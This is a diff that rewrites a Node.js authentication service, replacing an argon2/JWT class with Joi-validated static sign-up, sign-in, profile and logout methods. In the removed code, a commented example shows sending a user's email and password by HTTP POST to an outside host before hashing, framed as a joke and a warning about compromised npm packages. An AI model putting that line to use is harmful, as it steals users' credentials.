@@ -1,127 +1,95 @@
-import { Service, Inject } from 'typedi';
-import jwt from 'jsonwebtoken';
-import MailerService from './mailer';
-import config from '../config';
-import argon2 from 'argon2';
-import { randomBytes } from 'crypto';
-import { IUser, IUserInputDTO } from '../interfaces/IUser';
-import { EventDispatcher, EventDispatcherInterface } from '../decorators/eventDispatcher';
-import events from '../subscribers/events';
-
-@Service()
+import Joi from 'joi';
+import LoggerInstance from '../loaders/logger';
+import validation from './validations/user';
+import errorHandler from '../helpers/errorHandler';
+import User from '../models/User';
 export default class AuthService {
-  constructor(
-      @Inject('userModel') private userModel : Models.UserModel,
-      private mailer: MailerService,
-      @Inject('logger') private logger,
-      @EventDispatcher() private eventDispatcher: EventDispatcherInterface,
-  ) {}
-
-  public async SignUp(userInputDTO: IUserInputDTO): Promise<{ user: IUser; token: string }> {
+  static async signUp(userInput, res) {
     try {
-      const salt = randomBytes(32);
-
-      /**
-       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
-       * require('http')
-       *  .request({
-       *     hostname: 'http://my-other-api.com/',
-       *     path: '/store-credentials',
-       *     port: 80,
-       *     method: 'POST',
-       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
-       *
-       * Just kidding, don't do that!!!
-       *
-       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
-       * watches every API call and if it spots a 'password' and 'email' property then
-       * it decides to steal them!? Would you even notice that? I wouldn't :/
-       */
-      this.logger.silly('Hashing password');
-      const hashedPassword = await argon2.hash(userInputDTO.password, { salt });
-      this.logger.silly('Creating user db record');
-      const userRecord = await this.userModel.create({
-        ...userInputDTO,
-        salt: salt.toString('hex'),
-        password: hashedPassword,
+      const result = Joi.validate(userInput, validation.userSchema, {
+        convert: false,
       });
-      this.logger.silly('Generating JWT');
-      const token = this.generateToken(userRecord);
-
-      if (!userRecord) {
-        throw new Error('User cannot be created');
+      if (result.error === null) {
+        const { email } = userInput;
+        const existUser = await User.findOne({ email });
+        if (!existUser) {
+          const user = new User(userInput);
+          await user.save();
+          return { user };
+        }
+        throw new Error('User already exist');
       }
-      this.logger.silly('Sending welcome email');
-      await this.mailer.SendWelcomeEmail(userRecord);
-
-      this.eventDispatcher.dispatch(events.user.signUp, { user: userRecord });
-
-      /**
-       * @TODO This is not the best way to deal with this
-       * There should exist a 'Mapper' layer
-       * that transforms data from layer to layer
-       * but that's too over-engineering for now
-       */
-      const user = userRecord.toObject();
-      Reflect.deleteProperty(user, 'password');
-      Reflect.deleteProperty(user, 'salt');
-      return { user, token };
+      return errorHandler.validationError(res, result);
     } catch (e) {
-      this.logger.error(e);
+      LoggerInstance.error(e);
       throw e;
     }
   }
 
-  public async SignIn(email: string, password: string): Promise<{ user: IUser; token: string }> {
-    const userRecord = await this.userModel.findOne({ email });
-    if (!userRecord) {
-      throw new Error('User not registered');
-    }
-    /**
-     * We use verify from argon2 to prevent 'timing based' attacks
-     */
-    this.logger.silly('Checking password');
-    const validPassword = await argon2.verify(userRecord.password, password);
-    if (validPassword) {
-      this.logger.silly('Password is valid!');
-      this.logger.silly('Generating JWT');
-      const token = this.generateToken(userRecord);
-
-      const user = userRecord.toObject();
-      Reflect.deleteProperty(user, 'password');
-      Reflect.deleteProperty(user, 'salt');
-      /**
-       * Easy as pie, you don't need passport.js anymore :)
-       */
-      return { user, token };
-    } else {
-      throw new Error('Invalid Password');
+  static async signIn(userInput, res) {
+    try {
+      const { email, password } = userInput;
+      const result = Joi.validate(userInput, validation.signInUser, {
+        convert: false,
+      });
+      if (result.error === null) {
+        const user = await User.findOne({ email });
+        if (user) {
+          const isMatch = await user.comparePassword(password);
+          if (isMatch) {
+            const { token } = await user.generateToken();
+            return { token };
+          }
+          return res
+            .status(400)
+            .json({ loginSuccess: false, message: 'Password Incorrect' });
+        }
+        return res
+          .status(404)
+          .json({ loginSuccess: false, message: 'User Not Found' });
+      }
+      return errorHandler.validationError(res, result);
+    } catch (e) {
+      LoggerInstance.error(e);
+      throw e;
     }
   }
 
-  private generateToken(user) {
-    const today = new Date();
-    const exp = new Date(today);
-    exp.setDate(today.getDate() + 60);
+  static currentProfile(userDetails, res) {
+    if (userDetails) {
+      const {
+        isAdmin, email, firstname, lastname,
+      } = userDetails;
+      const user = {
+        isAdmin,
+        isAuth: true,
+        email,
+        firstname,
+        lastname,
+      };
+      return user;
+    }
+    return res.status(400).json({ message: 'User does not exist' });
+  }
 
-    /**
-     * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
-     * The cool thing is that you can add custom properties a.k.a metadata
-     * Here we are adding the userId, role and name
-     * Beware that the metadata is public and can be decoded without _the secret_
-     * but the client cannot craft a JWT to fake a userId
-     * because it doesn't have _the secret_ to sign it
-     * more information here: https://softwareontheroad.com/you-dont-need-passport
-     */
-    this.logger.silly(`Sign JWT for userId: ${user._id}`);
-    return jwt.sign(
-      {
-        _id: user._id, // We are gonna use this in the middleware 'isAuth'
-        role: user.role,
-        name: user.name,
-        exp: exp.getTime() / 1000,
-      },
-      config.jwtSecret,
-    );
+  static async logOut(userDetails, res) {
+    try {
+      LoggerInstance.info(userDetails._id);
+      const { token } = await User.findOneAndUpdate(
+        { _id: userDetails._id },
+        { token: '' },
+      );
+      LoggerInstance.info(token);
+      if (token === '') {
+        return res.status(200).json({
+          success: true,
+          message: 'Log out succesfully',
+        });
+      }
+    } catch (e) {
+      LoggerInstance.error(e);
+      throw e;
+    }
+    return false;
   }
 }
